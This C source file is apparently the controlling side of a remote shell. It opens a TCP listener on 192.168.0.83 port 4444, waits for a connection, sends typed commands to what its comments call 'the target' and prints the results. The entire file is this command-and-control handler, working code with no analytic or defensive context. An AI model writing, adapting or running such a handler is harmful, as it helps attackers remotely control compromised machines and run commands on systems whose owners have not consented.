#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char** argv){
	//Parameter for the server
	int sockt,cl_sock;

	char tot_resp[18384];
	char buf[1024];

	struct sockaddr_in srv_adr, cl_adr;

	int opv = 1;
    	int i = 0;
	
	//socket initialization
	socklen_t cl_len;
	sockt = socket(AF_INET, SOCK_STREAM, 0);
	
	//Fail check
	if(setsockopt(sockt,SOL_SOCKET, SO_REUSEADDR, &opv, sizeof(opv)) < 0) {
			printf("Error TCP socket");
			return 1;
	}
	
	//server TCP parameters (port, ipv4)
	srv_adr.sin_family = AF_INET;
	srv_adr.sin_addr.s_addr = inet_addr("192.168.0.83");
	srv_adr.sin_port = htons(4444);
	
	bind(sockt, (struct sockaddr *) &srv_adr, sizeof(srv_adr));
	listen(sockt,5);
	
	//client parameters
	cl_len = sizeof(cl_adr);
	cl_sock = accept(sockt, (struct sockaddr *) &cl_adr, &cl_len);

	//command shell
	while(1){
		jump:
		bzero(&buf, sizeof(buf));
		bzero(&tot_resp, sizeof(tot_resp));

		printf("~$_Shell_>: ", inet_ntoa(cl_adr.sin_addr));
		fgets(buf, sizeof(buf), stdin);

		//Remove newline before sending
		strtok(buf, "\n");
		
		//Send the command to the target
		write(cl_sock, buf, sizeof(buf));
		if (strncmp("q", buf, 1) == 0){
				break;
		}

		//Receive and print the tot_resp
		else {
				recv(cl_sock, tot_resp, sizeof(tot_resp), MSG_WAITALL);
				printf("%s", tot_resp);
		}
	}
}
